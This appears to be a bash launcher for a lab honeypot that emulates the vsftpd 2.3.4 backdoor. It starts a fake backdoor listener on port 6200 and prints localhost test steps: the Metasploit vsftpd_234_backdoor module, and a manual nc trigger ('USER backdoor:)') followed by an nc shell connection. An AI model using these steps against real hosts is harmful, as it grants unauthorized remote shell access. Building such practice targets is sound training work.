
#!/bin/bash
echo "Starting vsftpd 2.3.4 honeypot with backdoor..."

# Start the backdoor FIRST (important!)
python3 /honeypot/fake_exploit.py &
BACKDOOR_PID=$!

# Start vsftpd
/usr/sbin/vsftpd /etc/vsftpd.conf &
FTP_PID=$!

echo "[+] vsftpd 2.3.4 running on port 21"
echo "[+] Backdoor listening on port 6200"
echo "[+] Ready for Metasploit exploitation!"
echo ""
echo "Test with Metasploit:"
echo "  msfconsole"
echo "  use exploit/unix/ftp/vsftpd_234_backdoor"
echo "  set RHOSTS 127.0.0.1"
echo "  run"
echo ""
echo "Or manual test:"
echo "  echo -e 'USER backdoor:)\nPASS test' | nc 127.0.0.1 21"
echo "  sleep 2 && nc 127.0.0.1 6200"
echo "  Then type: id"

trap 'kill $BACKDOOR_PID $FTP_PID; exit' INT
wait
